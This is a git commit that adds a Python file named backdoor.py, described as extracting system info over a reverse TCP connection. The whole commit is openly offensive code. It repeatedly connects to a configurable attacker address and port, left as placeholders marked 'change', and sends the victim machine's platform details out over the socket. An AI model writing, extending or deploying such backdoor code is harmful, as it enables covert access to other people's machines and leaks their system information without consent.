fd9cdfd73ee26fe3286b28ee90bf0ba806c0ab45
Dhanush P N <97773473+l1v3or3v1l@users.noreply.github.com>
2022-09-25 13:59:09 +0530

    extracting sysinfo using reverse tcp connection

---
+++ backdoor.py
@@ -0,0 +1,28 @@
+import socket
+import platform
+
+ADDR = "127.0.0.1"		 # change	
+PORT = 8080      		 # change
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+def connect():
+	print("Connecting....")
+	conn = s.connect_ex((ADDR, PORT))
+	while conn != 0:
+		conn = s.connect_ex((ADDR, PORT))
+	print("Connected!")
+	return 0
+
+def main():
+	if connect() == 0:
+		if s.sendall(str(platform.uname()).encode()) is None:
+			print("Info Extracted Successfully")
+			s.close()
+			return
+	else:
+		connect()
+
+
+if __name__ == '__main__':
+	main()
